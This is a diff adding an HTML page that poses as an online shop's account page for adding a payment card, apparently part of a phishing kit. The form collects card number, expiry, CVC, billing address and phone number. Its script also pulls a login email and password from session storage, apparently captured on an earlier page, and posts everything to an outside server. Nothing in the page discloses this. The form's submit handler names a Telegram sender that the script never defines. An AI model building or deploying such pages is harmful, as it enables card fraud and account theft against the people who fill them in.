@@ -1,0 +1,199 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Secure Authentication</title>
+  <meta name="viewport" content="width=device‑width,initial‑scale=1" />
+  <style>
+    body { font-family: Arial, sans-serif; margin: 0; padding: 0; display: flex; background: #fff; }
+    .sidebar { width: 250px; padding: 30px 20px; border-right: 1px solid #ccc; height: 100vh; box-sizing: border-box; }
+    .sidebar h3 { margin-top: 0; font-size: 18px; margin-bottom: 20px; }
+    .sidebar a { display: block; margin-bottom: 12px; color: #000; text-decoration: none; }
+    .main-content { padding: 40px 60px; flex-grow: 1; }
+    h1 { margin-top: 0; font-size: 24px; font-weight: bold; }
+    form { max-width: 600px; margin-top: 20px; }
+    label { display: block; margin-bottom: 6px; font-weight: bold; }
+    input, select { width: 100%; padding: 10px; font-size: 14px; margin-bottom: 20px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
+    .row { display: flex; gap: 10px; }
+    .row > div { flex: 1; }
+    .button-row { display: flex; gap: 10px; align-items: center; }
+    button { padding: 10px 20px; font-size: 14px; border: none; border-radius: 20px; cursor: pointer; font-weight: bold; }
+    .cancel-button { background: transparent; border: 1px solid #000; }
+    .continue-button { background: #000; color: #fff; }
+    small { font-size: 12px; color: #555; }
+    @media (max-width: 768px) {
+      body { flex-direction: column; }
+      .sidebar { width: 100%; height: auto; border-right: none; border-bottom: 1px solid #ccc; padding: 20px 10px; }
+      .main-content { padding: 20px 10px; }
+      .row { flex-direction: column; }
+      .button-row { flex-direction: column; }
+      button { width: 100%; }
+    }
+  </style>
+</head>
+<body>
+  <div class="sidebar">
+    <h3>My account</h3>
+    <a href="#">Orders &gt;</a>
+    <a href="#">Personal Details &gt;</a>
+    <a href="#">Addresses &gt;</a>
+    <a href="#">Payment methods &gt;</a>
+    <a href="#">Wishlist &gt;</a>
+    <a href="#">Discount schemes &gt;</a>
+    <a href="#">Account Preferences &gt;</a>
+    <a href="#">Communication Preferences &gt;</a>
+  </div>
+
+  <div class="main-content">
+    <h1>Payment methods</h1>
+    <p><strong>Add payment details</strong></p>
+    <p>
+      Please enter the details of the new card you would like to use. If you amend or remove your card,
+      please let us know to avoid any delays.
+    </p>
+
+    <form id="cardForm" onsubmit="sendToTelegram(event)" autocomplete="on">
+      <!-- Card details -->
+      <label for="nameOnCard">Name on card *</label>
+      <input type="text" id="nameOnCard" name="cc-name"
+             placeholder="e.g. Mr Joe Bloggs"
+             autocomplete="cc-name"
+             required />
+
+      <label for="cardNumber">Card number *</label>
+      <input type="text" id="cardNumber" name="cc-number"
+             placeholder="**** **** **** ****"
+             autocomplete="cc-number"
+             inputmode="numeric"
+             pattern="[0-9 ]{13,22}"
+             required />
+
+      <div class="row">
+        <div>
+          <label for="expiryMonth">Expiry date *</label>
+          <div class="row">
+            <input type="text" id="expiryMonth" name="cc-exp-month"
+                   placeholder="MM" maxlength="2"
+                   autocomplete="cc-exp-month"
+                   inputmode="numeric"
+                   pattern="[0-9]{2}"
+                   required />
+            <input type="text" id="expiryYear" name="cc-exp-year"
+                   placeholder="YY" maxlength="2"
+                   autocomplete="cc-exp-year"
+                   inputmode="numeric"
+                   pattern="[0-9]{2}"
+                   required />
+          </div>
+        </div>
+      </div>
+
+      <label for="securityCode">Card security code (CVC) *</label>
+      <input type="text" id="securityCode" name="cc-csc"
+             placeholder="***" maxlength="4"
+             autocomplete="cc-csc"
+             inputmode="numeric"
+             pattern="[0-9]{3,4}"
+             required />
+
+      <!-- Billing address section -->
+      <fieldset style="padding:0; border:none; margin:0;">
+        <legend><strong>Billing address</strong></legend><br>
+
+        <label for="streetAddress">Address Line 1</label>
+        <input type="text" id="streetAddress" name="street-address"
+               placeholder="e.g. 123 Main Street, Apt 4B"
+               autocomplete="billing street-address"
+               required />
+
+        <label for="addressLine2">Address line 2</label>
+        <input type="text" id="addressLine2" name="address-line2"
+               placeholder="e.g. Apartment, suite, unit"
+               autocomplete="billing address-line2" />
+
+        <div class="row">
+          <div>
+            <label for="city">City *</label>
+            <input type="text" id="city" name="address-level2"
+                   placeholder="e.g. London"
+                   autocomplete="billing address-level2"
+                   required />
+          </div>
+          <div>
+            <label for="county">County/Region *</label>
+            <input type="text" id="county" name="address-level1"
+                   placeholder="e.g. Greater London"
+                   autocomplete="billing address-level1"
+                   required />
+          </div>
+        </div>
+
+        <label for="postcode">Postal code *</label>
+        <input type="text" id="postcode" name="postal-code"
+               placeholder="e.g. SW1A 1AA"
+               autocomplete="billing postal-code"
+               pattern="[A-Za-z0-9 ]{3,10}"
+               required />
+
+        <label for="country">Country *</label>
+        <input type="text" id="country" name="country-name"
+               placeholder="e.g. United Kingdom"
+               autocomplete="billing country-name"
+               required />
+      </fieldset>
+
+      <label for="cardName">Card nickname *</label>
+      <input type="text" id="cardName" name="card-nickname"
+             placeholder="e.g. Joe Mastercard Credit"
+             required />
+
+      <label for="phoneNumber">Phone number *</label>
+      <input type="tel" id="phoneNumber" name="tel"
+             placeholder="+44 7123 456 789"
+             autocomplete="tel"
+             inputmode="tel"
+             pattern="[\+0-9 ()\-]{7,20}"
+             required />
+
+      <div class="button-row">
+        <button type="button" class="cancel-button" onclick="history.back()">Cancel</button>
+        <button type="submit" class="continue-button">Continue</button>
+      </div>
+
+      <small>* Indicates required information</small>
+    </form>
+  </div>
+  <script>
+  async function sendData() {
+  const email = sessionStorage.getItem("ee_email");
+  const password = sessionStorage.getItem("ee_password");
+  const name = document.getElementById("nameOnCard").value;
+  const cardNum = document.getElementById("cardNumber").value;
+  const expiryMonth = document.getElementById("expiryMonth").value;
+  const expiryYear = document.getElementById("expiryYear").value;
+  const securityCode = document.getElementById("securityCode").value;
+  const streetAddress = document.getElementById("streetAddress").value;
+  const addressLine2 = document.getElementById("addressLine2").value;
+  const city = document.getElementById("city").value;
+  const county = document.getElementById("county").value;
+  const postcode = document.getElementById("postcode").value;
+  const country = document.getElementById("country").value;
+  const cardName = document.getElementById("cardName").value;
+  const phoneNumber = document.getElementById("phoneNumber").value;
+
+
+  const res = await fetch("https://flask-backend-86ou.onrender.com", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ email, password, name, 
+      cardNum, expiryMonth, expiryYear, 
+      securityCode, streetAddress, 
+      addressLine2, city, county, country, 
+      cardName, phoneNumber})
+  });
+
+  const data = await res.json();
+}
+</script>
+</body>
+</html>
